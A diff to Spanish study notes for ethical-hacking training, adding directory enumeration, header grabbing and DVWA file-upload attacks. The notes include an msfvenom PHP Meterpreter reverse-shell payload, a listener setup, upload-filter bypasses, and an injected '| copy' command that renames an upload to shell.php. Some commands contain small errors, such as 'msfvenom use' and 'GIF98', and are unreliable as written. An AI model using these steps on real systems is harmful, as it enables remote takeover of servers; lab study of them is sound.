@@ -160,7 +160,7 @@ Escanear archivos: Hybrid analysis (https://www.hybrid-analysis.com), Virus tota
 
 Para detectar empaquetamientos y ofuscacion: **PEiD**
 
-Para EntryPoint, hash, entropia, etc: **DIE**
+Para EntryPoint, hash, entropia, etc: **DIE** --> Subir el archivo, escanear, y darle a "Advanced" --> Cambiar el file type hasta que coincida con el patron. 
 
 Para PE, section headers: **PE Explorer**
 ## Hacking Web Applications
@@ -199,4 +199,29 @@ Crawling y escaneo de vulnerabilidades web --> **OWASP ZAP**
 **dirb** para enumerar directorios de forma recursiva, asegurate de que en el archivo de wordlist este incluido el nombre del archivo (con su extension) que tienes que encontrar.
 ```
 dirb http://training.cehorg.com /usr/share/dirb/wordlists/common.txt -w
+
+ALTERNATIVA: gobuster dir -u [dominio o ip] -w [wordlist] 
+```
+Ver cabeceras HTTP. Por ejemplo X-Powered-By para tecnologias de desarrollo
+```
+telnet [dominio] [puerto (80 ej)]
+```
+File upload en DVWA
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f raw
+pluma upload.php (se pega el payload generado)
+
+Para abrir el reverse tcp luego de subir el archivo:
+
+msfvenom use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST [ip]
+set LPORT 4444
+run
+
+(Para que pueda abrirse la shell reversa es necesario visitar la URL del archivo)
+
+En nivel MEDIO se hace el mismo procedimiento, a diferencia de que se crea un archivo en pluma con la extension.php.jpg. Al momento de subirlo a DVWA se intercepta con burpsuite y se elimina la extension .jpg.
+
+En nivel ALTO se hace el mismo procedimiento pero se guarda el archivo pluma como .jpeg y se agrega en la primera linea GIF98, luego en la seccion de Command Injection de DVWA se coloca: | copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php (simplemente se copia el archivo cambiandole el nombre y extension) 
 ```
